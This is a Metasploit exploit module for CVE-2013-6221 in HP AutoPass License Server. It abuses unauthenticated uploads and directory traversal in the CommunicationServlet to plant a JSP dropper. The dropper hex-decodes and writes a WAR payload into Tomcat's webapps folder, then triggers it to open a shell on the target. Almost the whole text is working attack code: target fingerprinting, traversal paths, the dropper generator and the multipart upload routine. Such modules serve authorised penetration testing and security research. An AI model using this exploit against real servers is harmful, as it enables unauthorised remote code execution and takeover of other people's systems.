##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'HP AutoPass License Server File Upload',
      'Description' => %q{
        This module exploits a code execution flaw in HP AutoPass License Server. It abuses two
        weaknesses in order to get its objective. First, the AutoPass application doesn't enforce
        authentication in the CommunicationServlet component. On the other hand, it's possible to
        abuse a directory traversal when uploading files thorough the same component, allowing to
        upload an arbitrary payload embedded in a JSP. The module has been tested successfully on
        HP AutoPass License Server 8.01 as installed with HP Service Virtualization 3.50.
      },
      'Author'       =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2013-6221'],
          ['ZDI', '14-195'],
          ['BID', '67989'],
          ['URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c04333125']
        ],
      'Privileged'  => true,
      'Platform'    => %w{ java },
      'Arch'        => ARCH_JAVA,
      'Targets'     =>
        [
          ['HP AutoPass License Server 8.01 / HP Service Virtualization 3.50', {}]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 10 2014'))

    register_options(
      [
        Opt::RPORT(5814),
        OptString.new('TARGETURI', [true, 'Path to HP AutoPass License Server Application', '/autopass']),
        OptInt.new('INSTALL_DEPTH', [true, 'Traversal Depth to reach the HP AutoPass License Server folder', 4]),
        OptInt.new('WEBAPPS_DEPTH', [true, 'Traversal Depth to reach the Tomcat webapps folder', 1])
      ], self.class)
  end


  def check
    check_code = Exploit::CheckCode::Safe

    res = send_request_cgi(
      {
        'uri'    => normalize_uri(target_uri.path.to_s, "cs","pdfupload"),
        'method' => 'POST'
      })

    unless res
      check_code = Exploit::CheckCode::Unknown
    end

    if res && res.code == 500 &&
       res.body.to_s.include?("HP AutoPass License Server") &&
       res.body.to_s.include?("java.lang.NullPointerException") &&
       res.body.to_s.include?("com.hp.autopass")

      check_code = Exploit::CheckCode::Detected
    end

    check_code
  end

  def exploit
    app_base = rand_text_alphanumeric(4+rand(32-4))
    war = payload.encoded_war({ :app_name => app_base }).to_s
    war_filename = "#{app_base}.war"

    # By default, the working directory when executing the JSP is:
    # C:\Program Files\HP\HP AutoPass License Server\HP AutoPass License Server\HP AutoPass License Server\bin
    # The war should be dropped to the next location to autodeploy:
    # C:\Program Files\HP\HP AutoPass License Server\HP AutoPass License Server\HP AutoPass License Server\webapps
    war_traversal = webapps_traversal
    war_traversal << "webapps/#{war_filename}"
    dropper = jsp_drop_bin(war, war_traversal)
    dropper_filename = rand_text_alpha(8) + ".jsp"

    print_status("#{peer} - Uploading the JSP dropper #{dropper_filename}...")
    # The JSP, by default, is uploaded to:
    # C:\Program Files\HP\HP AutoPass License Server\AutoPass\LicenseServer\conf\pdfiles\
    # In order to execute it, through the AutoPass application we would like to drop it here:
    # C:\Program Files\HP\HP AutoPass License Server\HP AutoPass License Server\HP AutoPass License Server\webapps\autopass\scripts
    dropper_traversal = install_traversal
    dropper_traversal << "/HP AutoPass License Server/HP AutoPass License Server/webapps/autopass/scripts/#{dropper_filename}"
    res = upload_file(dropper_traversal, dropper)

    register_files_for_cleanup("#{webapps_traversal}webapps/autopass/scripts/#{dropper_filename}")
    register_files_for_cleanup("#{webapps_traversal}webapps/#{war_filename}")

    unless res && res.code == 500 &&
           res.body.to_s.include?("HP AutoPass License Server") &&
           res.body.to_s.include?("java.lang.NullPointerException") &&
           res.body.to_s.include?("com.hp.autopass")

      print_error("#{peer} - Unexpected response... upload maybe failed, trying anyway...")
    end

    res = send_request_cgi({
      'uri'    => normalize_uri(target_uri.path, "scripts", dropper_filename),
      'method' => 'GET'
    })

    unless res and res.code == 200
      print_error("#{peer} - Unexpected response after executing the dropper...")
    end

    10.times do
      select(nil, nil, nil, 2)

      # Now make a request to trigger the newly deployed war
      print_status("#{peer} - Attempting to launch payload in deployed WAR...")
      res = send_request_cgi(
        {
          'uri'    => normalize_uri(app_base, Rex::Text.rand_text_alpha(rand(8)+8) + ".jsp"),
          'method' => 'GET'
        })
      # Failure. The request timed out or the server went away.
      break if res.nil?
      # Success! Triggered the payload, should have a shell incoming
      break if res.code == 200
    end
  end

  def webapps_traversal
    "../" * datastore['WEBAPPS_DEPTH']
  end

  def install_traversal
    "/.." * datastore['INSTALL_DEPTH']
  end

  # Using a JSP dropper because the vulnerability doesn't allow to upload
  # 'binary' files, so a WAR can't be uploaded directly.
  def jsp_drop_bin(bin_data, output_file)
    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
    jspraw << %Q|<%\n|
    jspraw << %Q|String data = "#{Rex::Text.to_hex(bin_data, "")}";\n|

    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream("#{output_file}");\n|

    jspraw << %Q|int numbytes = data.length();\n|

    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\n|
    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\n|
    jspraw << %Q|{\n|
    jspraw << %Q|  char char1 = (char) data.charAt(counter);\n|
    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\n|
    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\n|
    jspraw << %Q|  comb <<= 4;\n|
    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\n|
    jspraw << %Q|  bytes[counter/2] = (byte)comb;\n|
    jspraw << %Q|}\n|

    jspraw << %Q|outputstream.write(bytes);\n|
    jspraw << %Q|outputstream.close();\n|
    jspraw << %Q|%>\n|

    jspraw
  end

  def upload_file(file_name, contents)
    post_data = Rex::MIME::Message.new
    post_data.add_part(contents, "application/octet-stream", nil, "form-data; name=\"uploadedFile\"; filename=\"#{file_name}\"")

    data = post_data.to_s

    res = send_request_cgi(
      {
        'uri'    => normalize_uri(target_uri.path.to_s, "cs","pdfupload"),
        'method' => 'POST',
        'data'   => data,
        'ctype'  => "multipart/form-data; boundary=#{post_data.bound}"
      })

    res
  end

end
